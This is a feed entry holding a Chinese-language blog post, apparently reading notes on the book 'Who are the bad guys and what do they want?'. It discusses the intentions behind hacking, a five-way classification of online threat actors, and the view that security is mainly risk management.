&lt;h2 id=&quot;0x01-白帽子还是黑帽子&quot;&gt;&lt;a href=&quot;#0x01-白帽子还是黑帽子&quot; class=&quot;headerlink&quot; title=&quot;0x01 白帽子还是黑帽子&quot;&gt;&lt;/a&gt;0x01 白帽子还是黑帽子&lt;/h2&gt;&lt;p&gt;我们经常会给一些hacker或是cracker（这两者是很不一样的）贴上一些标签，这是个白帽子平台，那是个黑帽子社区等等。但在文章中提到，有时候这些表面上的标签往往会让我们忽视某一群体在发现漏洞时的意图。&lt;/p&gt;
&lt;p&gt;那么在这种情况下，单纯的用“好人”或者“坏人”这样二进制意味浓厚的划分原则将会掩盖复杂的入侵意图。&lt;/p&gt;
&lt;p&gt;使用意图来对攻击进行定义或许能够让我们看到事情的本质。有些是出于研究意图的测试，那么这种行为往往带有友好的提醒；有些是出于个人情感，对于个人或者企业的一种打击报复；有些纯粹是出于贪婪，企图获取金钱或者其他利益；还有的可能是更复杂的情况，包括各国之间的窥探行为，或者只是偶然的一个点击等等，这些意图彼此之间并非泾渭分明的，它们往往能够在一定条件下进行转化。&lt;/p&gt;
&lt;p&gt;实际情况将会比上述这样简单的理论层面的分类更趋于多样化，大家也可以结合自身的经历来分析身边的“意图”，而不是仅仅靠扣上几个颜色的帽子就定义出谁是正义的谁是邪恶的。&lt;/p&gt;
&lt;h2 id=&quot;0x02-隐匿在网络中的人&quot;&gt;&lt;a href=&quot;#0x02-隐匿在网络中的人&quot; class=&quot;headerlink&quot; title=&quot;0x02 隐匿在网络中的人&quot;&gt;&lt;/a&gt;0x02 隐匿在网络中的人&lt;/h2&gt;&lt;p&gt;很多时候，我们的视线都汇聚到一个0day是怎么实现的、泄露出的数据体量到底有多少、哪个著名的企业在圣诞前夕又被DDOS威胁了等等这些十分吸引眼球的问题上，当然关注这些问题也是十分有意义的。不过，对于漏洞背后人的探索似乎很多时候没有引起足够多的关注。&lt;/p&gt;
&lt;p&gt;之前说过我们不应该简单的通过扣帽子的方式来给网络中的人们下定义，而是应该确定出那些驱使他们挖掘漏洞的因素。&lt;/p&gt;
&lt;p&gt;这里用了书中的一张表来对网络中的活动者下定义，&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160518204514.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这张表中划分出的类别算是补充了之前我的认知，他将网络中的活动者分成了五类，其实这些词不是太好准确的翻译，大概是内部人员、网络犯罪者、纯粹的黑客、恐怖分子和国家层面活动者，同样的，这些角色彼此之间也都是有关联的，那么按照我的想法，将图中几个角色的位置重新放置一下，我们其实可以做一个雷达图来对每一个信息安全事件背后的行动派进行角色判定，这样我们更能够清晰的认识到许多的网络活动的目的都不会那么的单一。&lt;/p&gt;
&lt;h2 id=&quot;0x03-是管理风险还是管理代码&quot;&gt;&lt;a href=&quot;#0x03-是管理风险还是管理代码&quot; class=&quot;headerlink&quot; title=&quot;0x03 是管理风险还是管理代码&quot;&gt;&lt;/a&gt;0x03 是管理风险还是管理代码&lt;/h2&gt;&lt;p&gt;另一个在书中提到的认知就是，信息安全的问题恐怕很难通过技术的进步去解决，无论你有多么先进的加密手段、无论你的机器学习能够模仿多么专业的安全研究人员，入侵者依然能够找到撕破防线的短板。当防线被攻破，最终，信息安全问题转化为了一个风险控制的问题。&lt;/p&gt;
&lt;p&gt;那么在这种情况下，采用更加合理的风险控制策略可能起到的作用会大于在代码中加入了一段安全的防护。当然，这两者并未站在对立的两个极端，我们显然可以通过彼此结合的手段来增强对资产的防护，当然，这里提到的是谁更应该放在主位的问题。&lt;/p&gt;
&lt;h2 id=&quot;0x04-结尾&quot;&gt;&lt;a href=&quot;#0x04-结尾&quot; class=&quot;headerlink&quot; title=&quot;0x04 结尾&quot;&gt;&lt;/a&gt;0x04 结尾&lt;/h2&gt;&lt;p&gt;就瞎扯到这里，好像后面和主题已经无关了，不管那么多了。&lt;/p&gt;
&lt;p&gt;有兴趣的可以阅读他们的原书。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;最近一段时间都在赶毕业设计了，觉得这期间被挖出来的那些影响比较大的漏洞都没有细致的去了解。不过论文之余，晚上睡前都在看Gregory Fell和Mike Barlow的《Who are the bad guys and what do they want？》，其中的第一部分就是书名的前半段。&lt;/p&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://phantom0301.coding.me/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="信息安全" scheme="http://phantom0301.coding.me/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="闲谈" scheme="http://phantom0301.coding.me/tags/%E9%97%B2%E8%B0%88/"/>
    
  </entry>
  
</feed>
